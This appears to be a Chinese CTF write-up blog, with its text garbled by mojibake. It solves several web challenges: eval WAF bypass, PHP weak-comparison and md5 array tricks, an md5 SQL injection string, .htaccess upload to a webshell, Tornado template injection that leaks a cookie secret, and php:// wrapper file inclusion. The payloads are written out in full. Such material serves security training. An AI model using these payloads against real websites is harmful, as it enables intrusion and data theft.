<p>é¦–å…ˆkeyåªèƒ½æ˜¯æ•°å­— å…¶æ¬¡æ¯”è¾ƒçš„æ˜¯keyçš„åè¿›åˆ¶å¤§å°</p>
<p>åœ¨phpä¸­ ä¸¤ä¸ªç­‰å·&#x3D;&#x3D; ä»£è¡¨å¼±æ¯”è¾ƒ</p>
<p>å¼±æ¯”è¾ƒï¼šç­‰é•¿çš„ä¸¤ä¸ªå­—ç¬¦ä¸² å…¨éƒ¨å˜ä¸ºæ•´æ•° å¦‚æœå«æœ‰å­—æ¯ åˆ™å€¼ä¸º0 å†è¿›è¡Œæ¯”è¾ƒæ˜¯å¦ç›¸ç­‰</p>
<p>å› æ­¤åœ¨è¿™ä¸ªæƒ…å†µä¸‹åªéœ€è¦ä¼ å…¥ åœ¨index.phpä¸‹ æˆ–è€…ç›´æ¥åœ¨èµ·å§‹ç›®å½•ä¸‹å‡å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?key=123<br></code></pre></td></tr></table></figure>

<h3 id="6ã€-RoarCTF-2019-Easy-Calc"><a href="#6ã€-RoarCTF-2019-Easy-Calc" class="headerlink" title="6ã€[RoarCTF 2019]Easy Calc"></a>6ã€[RoarCTF 2019]Easy Calc</h3><p>F12æ£€æŸ¥æºä»£ç å‘ç° calc.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">$(<span class="hljs-string">&#x27;#calc&#x27;</span>).<span class="hljs-title function_ invoke__">submit</span>(function()&#123;<br>    $.<span class="hljs-title function_ invoke__">ajax</span>(&#123;<br>        <span class="hljs-attr">url</span>:<span class="hljs-string">&quot;calc.php?num=&quot;</span>+<span class="hljs-title function_ invoke__">encodeURIComponent</span>($(<span class="hljs-string">&quot;#content&quot;</span>).<span class="hljs-title function_ invoke__">val</span>()),<br>        type:<span class="hljs-string">&#x27;GET&#x27;</span>,<br>        success:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;<br>            $(<span class="hljs-string">&quot;#result&quot;</span>).<span class="hljs-title function_ invoke__">html</span>(`&lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;alert alert-success&quot;</span>&gt;<br>        &lt;strong&gt;ç­”æ¡ˆ:&lt;/strong&gt;$&#123;data&#125;<br>        &lt;/div&gt;`);<br>        &#125;,<br>        error:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;è¿™å•¥?ç®—ä¸æ¥!&quot;</span>);<br>        &#125;<br>    &#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;)<br></code></pre></td></tr></table></figure>

<p>ç‚¹è¿›calc.phpä¹‹åå‘ç°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä¼ å…¥num&#x3D;1ä¹‹å å¯ä»¥å›æ˜¾</p>
<p>ä½†æ˜¯ä¼ å…¥num&#x3D;aä¹‹å ä¸èƒ½å›æ˜¾</p>
<p>å¹¶ä¸”ç”±blacklistå¯çŸ¥ è®¾ç½®äº†å±è”½ åˆ™æœ€åçš„payloadä¸­å­—ç¬¦åº”è¯¥ä½¿ç”¨chr()å‡½æ•°è¿›è¡Œç»•è¿‡ chré‡Œçš„æ•°å­—ä¸ºasciiå€¼</p>
<p>è§£å†³æ–¹æ³• åœ¨numå‰æ·»åŠ ä¸€ä¸ªç©ºæ ¼ phpåœ¨è¯»å–çš„æ—¶å€™ä¼šé»˜è®¤åˆ é™¤è¿™ä¸ªç©ºæ ¼ è€Œwafåˆä¼šå› ä¸ºç©ºæ ¼æ£€æµ‹ä¸åˆ°numè¿™ä¸ªå‚æ•°</p>
<p>æ ‡å‡†çš„åˆ—å‡ºæ–‡ä»¶ç›®å½•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">? num=var_dump(scandir(/))<br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨chr</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">? num=var_dump(scandir(chr(47)))<br></code></pre></td></tr></table></figure>

<p>è·å–åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&quot;f1agg&quot; <br></code></pre></td></tr></table></figure>

<p>åˆ™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">? num=file_get_contents(/f1agg)<br></code></pre></td></tr></table></figure>

<p>å³</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))<br></code></pre></td></tr></table></figure>

<h3 id="7ã€-æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#7ã€-æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="7ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>7ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h3><p>æœ¬é¢˜çš„å…³é”®æ˜¯ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">is_numeric<br></code></pre></td></tr></table></figure>

<p>æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">%00<br>%20 å³ç©ºæ ¼<br>æ”¾åœ¨æ•°å€¼åé¢<br></code></pre></td></tr></table></figure>

<p>åœ¨æ”¹ç”¨POSTæ–¹æ³•ä¹‹å åœ¨è¯·æ±‚å¤´ä¸­æ·»åŠ äº†å¦‚ä¸‹å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">password=404%20&amp;money=100000000<br></code></pre></td></tr></table></figure>

<p>è¿”å›äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">you are Cuiter<br>Password Right!<br>Nember lenth is too long<br></code></pre></td></tr></table></figure>

<p>å³æ•°å­—é•¿åº¦å¤ªé•¿</p>
<p>è€ƒè™‘ç§‘å­¦è®¡æ•°æ³•è¿›è¡Œç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">money=1e8<br></code></pre></td></tr></table></figure>

<p>ç»•è¿‡å¤±è´¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">you have not enough money<br></code></pre></td></tr></table></figure>

<p>é‚£å°±</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">money=1e9<br></code></pre></td></tr></table></figure>

<p>æˆåŠŸ</p>
<p>è¿˜æœ‰ä¸€ç§æ˜¯æ ¹æ®strcmpå‡½æ•°ç‰¹æ€§è¿›è¡Œç»•è¿‡çš„æ–¹å¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">moneyp[]=100000000<br></code></pre></td></tr></table></figure>

<h3 id="8ã€-BJDCTF2020-Easy-MD5"><a href="#8ã€-BJDCTF2020-Easy-MD5" class="headerlink" title="8ã€ [BJDCTF2020]Easy MD5"></a>8ã€ [BJDCTF2020]Easy MD5</h3><p>åªæœ‰ä¸€ä¸ªæ¡† ä¸çŸ¥é“æ˜¯å¹²ä»€ä¹ˆç”¨çš„</p>
<p>æŠ“åŒ…å åœ¨requesté‡Œä»€ä¹ˆä¹Ÿæ²¡æ‰¾åˆ° ä½†æ˜¯åœ¨responseé‡Œé¢æ‰¾åˆ°äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Hint: select * from &#x27;admin&#x27; where password=md5($pass,true)<br></code></pre></td></tr></table></figure>

<p>çœ‹åˆ°è¿™ä¸ªå°±è¦æƒ³èµ·å¸¸ç”¨çš„ç»•è¿‡md5çš„æ–¹å¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ffifdyop<br></code></pre></td></tr></table></figure>

<p>ä¼ å‚å è¿›å…¥ä¸‹ä¸€ä¸ªé¡µé¢</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>))&#123;<br>    <span class="hljs-comment">// wow, glzjin wants a girl friend.</span><br>--&gt;<br></code></pre></td></tr></table></figure>

<p>åˆ™å¯»æ±‚md5çš„ä¸€ç»„ç¢°æ’ æˆ– åˆ©ç”¨phpæ•°ç»„è¿›è¡Œç»•è¿‡ å› ä¸ºå“ˆå¸Œå‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ æ•…md5å‡½æ•°è¿”å›çš„å€¼ä¸€å®šæ˜¯false è€Œfalseç­‰äºfalseä¸€å®šæˆç«‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?a[]=1&amp;b[]=2<br></code></pre></td></tr></table></figure>

<p>æ¥åˆ°ä¸‹ä¸€ä¸ªé¡µé¢</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ³¨æ„è¿™é‡Œçš„æ–¹æ³•æ˜¯post å› æ­¤ä¸èƒ½å•çº¯çš„åœ¨urlååŠ ä¸Šï¼Ÿparam1[]&#x3D;</p>
<p>å› æ­¤ä½¿ç”¨burpæŠ“åŒ… æ”¹ä¸ºpostæ–¹æ³•åå¾—åˆ°flag</p>
<h3 id="9ã€-HCTF-2018-admin"><a href="#9ã€-HCTF-2018-admin" class="headerlink" title="9ã€ [HCTF 2018]admin"></a>9ã€ [HCTF 2018]admin</h3><p>æŸ¥çœ‹æºä»£ç  å‘ç°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;!-- you are not admin --&gt;<br></code></pre></td></tr></table></figure>

<p>å¾—çŸ¥ è´¦æˆ·éœ€è¦ä¸ºadminæ‰å¯ä»¥è§¦å‘æŸäº›ä¸œè¥¿</p>
<p>å°è¯•è¾“å…¥adminè´¦æˆ· ç»“æœå¯†ç 123ç›´æ¥çˆ†äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">flag&#123;c667ed32-7557-4530-b11c-40031e8dba73&#125;<br></code></pre></td></tr></table></figure>

<p>åŠ å…¥æ²¡çˆ†å‘¢ æˆ‘ä»¬æŒ‰æ­£å¸¸çš„æµç¨‹æ¥å†™ä¸€å†™ å¤§è‡´æ‰«ä¸€éæ¯ä¸ªé¡µé¢çš„æºä»£ç é¡µ å‘ç°å¯†ç ä¿®æ”¹é¡µé¢å‡ºç°äº†githubæºç æ³„éœ²</p>
<p><a target="_blank" rel="noopener" href="https://github.com/woadsl1234/hctf_flask/">https://github.com/woadsl1234/hctf_flask/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/woadsl1234/hctf_flask/">https://github.com/woadsl1234/hctf_flask/</a></p>
<p>ç»“æœç›´æ¥æ‰¾ä¸åˆ°è¯¥é¡¹ç›®</p>
<p>åœ¨ç½‘ä¸Šæ‰¾äº†æ‰¾æ¥ä¸‹æ¥çš„æµç¨‹</p>
<p>åˆ©ç”¨flaskè¿›è¡Œsessionä¼ªé€  æˆ–è€…åˆ©ç”¨unicodeæ¬ºéª—</p>
<h3 id="10ã€-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#10ã€-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="10ã€[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>10ã€[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h3><p>è¯•äº†ä¸€ä¸‹ ç®€å•çš„ä¸Šä¼ å¹¶ä¸å¯ä»¥</p>
<p>å°è¯•ä½¿ç”¨.htaccessæ–¹æ³• åœ¨.htaccessæ–‡ä»¶ä¸­å†™å…¥ä»¥ä¸‹å†…å®¹ ä½¿è¯¥ç›®å½•ä¸‹å¸¦æœ‰neneçš„æ–‡ä»¶è¢«å½“æˆphpæ–‡ä»¶æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;FilesMatch &quot;nene&quot;&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure>

<p>åœ¨ä¸Šä¼ çš„è¿‡ç¨‹ä¸­è®°å¾—ä¿®æ”¹ç±»å‹ å›æ˜¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Warning: mkdir(): File exists in /var/www/html/upload.php on line 23<br>/var/www/html/upload/5666afe9f19a4b6badfdbbd320593274/.htaccess succesfully uploaded!<br></code></pre></td></tr></table></figure>

<p>åˆ™ ä¸Šä¼ æˆåŠŸ</p>
<p>å†ä¸Šä¼ nene.png å½“ç„¶æ–‡ä»¶å†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬</p>
<p>ä¸Šä¼ æˆåŠŸååˆ™è¿æ¥webshellå³å¯åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag</p>
<h3 id="11ã€-æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#11ã€-æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="11ã€[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>11ã€[æŠ¤ç½‘æ¯ 2018]easy_tornado</h3><p>æ‰“å¼€é¡µé¢åå‘ç°ä¸‰ä¸ªé“¾æ¥</p>
<p>flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/flag.txt<br>flag in /fllllllllllllag<br></code></pre></td></tr></table></figure>

<p>welcome</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/welcome.txt<br>render<br></code></pre></td></tr></table></figure>

<p>hints</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/hints.txt<br>md5(cookie_secret+md5(filename))<br></code></pre></td></tr></table></figure>

<p>åˆ™è§£æ­¤é¢˜éœ€è¦çŸ¥é“md5(&#x2F;fllllllllllllag)çš„å€¼ è¿™ä¸ªä¸éš¾</p>
<p>è¿˜è¦çŸ¥é“cookie_secretçš„å€¼</p>
<p>renderæç¤ºæˆ‘ä»¬å­˜åœ¨æ¨¡æ¿æ³¨å…¥ åˆ™å°è¯•ä»¥ä¸‹æ–¹å¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">error?msg=&#123;&#123;nene&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>é¡µé¢å›æ˜¾nene åˆ™çš„ç¡®å­˜åœ¨æ¨¡æ¿æ³¨å…¥</p>
<p>è‹¥æƒ³æŸ¥çœ‹cookie_secret åªéœ€è¦åˆ©ç”¨æ¨¡æ¿æ³¨å…¥çˆ†å‡ºhandler.settingså³å¯ åˆ™payloadä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">error?msg=&#123;&#123;handler.settings&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>åˆ™è·å–åˆ°å¦‚ä¸‹ä¿¡æ¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, <br>&#x27;cookie_secret&#x27;: &#x27;cd020bca-8f03-4346-aca0-3411a64d4a96&#x27;&#125;<br></code></pre></td></tr></table></figure>

<p>é‚£ä¹ˆå°±è·å¾—äº†cookie_secret</p>
<p>payloadå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import hashlib<br>cookie=&#x27;cd020bca-8f03-4346-aca0-3411a64d4a96&#x27;<br>file_filename=&#x27;/fllllllllllllag&#x27;<br>md5_filename=hashlib.md5(file_filename.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()<br>word=cookie+md5_filename<br>flag=hashlib.md5(word.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()<br>print(flag)<br></code></pre></td></tr></table></figure>

<p>ç„¶åæ‹¼æ¥ä¸€ä¸‹ç½‘å€å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">file?filename=/fllllllllllllag&amp;filehash=0cb78594c1a115a6df1ea1f0a3a359e2<br></code></pre></td></tr></table></figure>

<h3 id="12ã€-ZJCTF-2019-NiZhuanSiWei"><a href="#12ã€-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="12ã€[ZJCTF 2019]NiZhuanSiWei"></a>12ã€[ZJCTF 2019]NiZhuanSiWei</h3><p>è¿›å»çœ‹åˆ°å‡ è¡Œä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä»ä¸Šå¾€ä¸‹ä¾æ¬¡çœ‹</p>
<p>ç¬¬ä¸€ä¸ªåˆ¤æ–­</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctfâ€œ)<br></code></pre></td></tr></table></figure>

<p>file_get_contentså‡½æ•°ä»æ–‡ä»¶ä¸­è¯»å–å†…å®¹ è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨phpä¼ªåè®®ä¸­çš„data:&#x2F;&#x2F;åè®®æ¥ç»•è¿‡ payloadå¦‚ä¸‹ æ³¨æ„æ˜¯getæ–¹æ³•æäº¤å‚æ•° å› æ­¤å¯ä»¥ç›´æ¥åœ¨urlåé¢åŠ ä¸Š?text&#x3D;æ¥æµ‹è¯•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?text=data://text/plain,welcome to the zjctf<br></code></pre></td></tr></table></figure>

<p>ç»•è¿‡æˆåŠŸ</p>
<p>æ¥ä¸‹æ¥æ˜¯å…³äºflag.phpçš„æ­£åˆ™åŒ¹é…</p>
<p>è§‚å¯Ÿåˆ°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br></code></pre></td></tr></table></figure>

<p>å¦‚æœæƒ³è¦æŸ¥çœ‹useless.phpçš„æºç  æˆ‘ä»¬å¯ä»¥ä½¿ç”¨phpä¼ªåè®®çš„php:&#x2F;&#x2F;flteråè®®æ¥æŸ¥çœ‹<br>æˆ‘ä»¬ä½¿ç”¨ç¬¬äºŒä¸ªpayloadæŸ¥çœ‹è¯¥é¡µé¢çš„æºç  ç”¨&amp;&amp;è¿æ¥ åœ¨ç¬¬ä¸€ä¸ªåé¢ åŒæ—¶æäº¤è¿™ä¸¤ä¸ªå‚æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">file=php://filter/read=convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?text=data://text/plain,welcome to the zjctf&amp;&amp;file=php://filter/read=convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°uselessé¡µé¢çš„å†…å®¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span 